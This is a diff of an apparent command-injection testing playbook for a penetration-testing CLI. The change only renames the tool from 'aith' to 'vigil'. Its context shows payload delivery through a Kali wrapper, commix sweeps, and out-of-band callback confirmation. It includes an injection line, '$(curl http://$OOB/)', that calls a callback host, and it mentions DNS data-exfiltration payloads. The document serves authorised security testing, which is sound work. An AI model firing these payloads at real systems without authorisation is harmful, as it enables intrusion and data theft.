@@ -1,7 +1,7 @@
 ---
 name: command-injection
 description: OS command injection and argument injection — detection, blind confirmation, filter bypass, and modern framework realities
-origin: AI Threat Hunting
+origin: Vigil
 ---
 
 # Command Injection Testing
@@ -19,11 +19,11 @@ Command injection in 2025 lives in: file conversion endpoints (ImageMagick, FFmp
 
 ## Tools
 
-- `aith assess kali exec -- curl ...` (deliver injection payloads — all target-facing requests must go through the kali exec wrapper; use `--technique CMDI --probe-kind payload --phase consume-test --timeout 30`, switching to `--probe-kind exploit` once code execution is confirmed)
+- `vigil assess kali exec -- curl ...` (deliver injection payloads — all target-facing requests must go through the kali exec wrapper; use `--technique CMDI --probe-kind payload --phase consume-test --timeout 30`, switching to `--probe-kind exploit` once code execution is confirmed)
 - Burp Suite Repeater + Intruder (craft the request — then replay via kali exec for audit pipeline coverage)
-- `aith assess kali exec --technique CMDI --probe-kind payload --phase consume-test --timeout 300 -- commix ...` (automated command injection — useful for initial sweep, but misses argument injection entirely)
-- `aith assess classify-payload <value> --mutations` (type the injected parameter value and generate type-aware variants — see "Type the Injected Value First" below)
-- `aith oob mint` / `aith oob poll` (mint a nonce-tagged callback URL and correlate blind-injection hits — see DNS-Based below; this replaces reading the listener log by hand)
+- `vigil assess kali exec --technique CMDI --probe-kind payload --phase consume-test --timeout 300 -- commix ...` (automated command injection — useful for initial sweep, but misses argument injection entirely)
+- `vigil assess classify-payload <value> --mutations` (type the injected parameter value and generate type-aware variants — see "Type the Injected Value First" below)
+- `vigil oob mint` / `vigil oob poll` (mint a nonce-tagged callback URL and correlate blind-injection hits — see DNS-Based below; this replaces reading the listener log by hand)
 - Custom wordlists for injection payloads (prepare host-side, deliver via kali exec)
 
 ---
@@ -67,9 +67,9 @@ This matters more than most testers realize:
 Command injection parameters are rarely free-form — they carry a *filename*, a *hostname*, a *URL*, a *path*, or an *ID* that the app hands to an OS command. Before hand-picking separators, classify the value you are about to tamper with and let the oracle enumerate type-appropriate variants. This is most useful for the **argument-injection** and **filename-as-flag** paths below, where the productive payload is a format/escalation variant of the legitimate value, not a shell separator.
 
 ```bash
-aith assess classify-payload "report-2025.png" --mutations
-aith assess classify-payload "https://target/img.jpg" --mutations    # type: url
-aith assess classify-payload "../uploads/file.pdf" --mutations        # type: path
+vigil assess classify-payload "report-2025.png" --mutations
+vigil assess classify-payload "https://target/img.jpg" --mutations    # type: url
+vigil assess classify-payload "../uploads/file.pdf" --mutations        # type: path
 ```
 
 Consume the output by intent bucket:
@@ -221,7 +221,7 @@ Sleep-based detection is unreliable in noisy networks. A 5-second payload that a
 **Triaging a separator sweep:** when you fire a batch of separator/bypass variants (the table above, or a commix run) and the timing signal is muddy, capture each response as a record (`{"url":..., "status":..., "content_length":..., "words":..., "lines":...}`) and let the anomaly oracle pick the odd one out instead of eyeballing dozens of near-identical bodies:
 
 ```bash
-aith assess anomaly-score responses.jsonl --top 5
+vigil assess anomaly-score responses.jsonl --top 5
 ```
 
 The injected-command response usually diverges from the benign-separator population on `status`, `length_bucket`, or `words_bucket`. Investigate the top-ranked outlier first — that is the separator that reached the shell. A flat ranking (every record scores ~0) means no separator changed the response shape: the value is sanitized or you are on a direct-exec path (argument injection only).
@@ -230,11 +230,11 @@ The injected-command response usually diverges from the benign-separator populat
 
 DNS callbacks are the most reliable blind confirmation because they are out-of-band and binary (hit or no hit).
 
-Confirm readiness with `aith oob status --json`, then **mint a nonce-tagged callback** so the hit is self-correlating instead of eyeballed out of the listener log:
+Confirm readiness with `vigil oob status --json`, then **mint a nonce-tagged callback** so the hit is self-correlating instead of eyeballed out of the listener log:
 
 ```bash
 # Mint one nonce per injection point; record the correlation context.
-aith oob mint --technique cmdi --target-url "https://target/convert" --param filename --probe-kind dns
+vigil oob mint --technique cmdi --target-url "https://target/convert" --param filename --probe-kind dns
 # -> nonce  <prefix>-<token>
 #    http   http://<prefix>-<token>.oob.example.com/
 #    dns    <prefix>-<token>.oob.example.com
@@ -259,7 +259,7 @@ $(curl http://$OOB/)
 Then **poll for the correlated hit** instead of reading the listener log by hand:
 
 ```bash
-aith oob poll --client <name> --json
+vigil oob poll --client <name> --json
 ```
 
 Consume the result by reading the `matched` array: each entry pairs the callback (`protocol`, `remote_address`, `observed_at`) with the recorded probe (`technique`, `target_url`), so a non-empty `matched` for your nonce is the binary confirmation — no log grepping. A DNS-data-exfil payload surfaces the leaked value as the left label of the matched callback host. `unmatched` interactions are callbacks with no recorded probe (background noise or another technique). If `matched` stays empty after the payload lands, fall back to timing and record a runtime issue noting OOB would have been decisive.
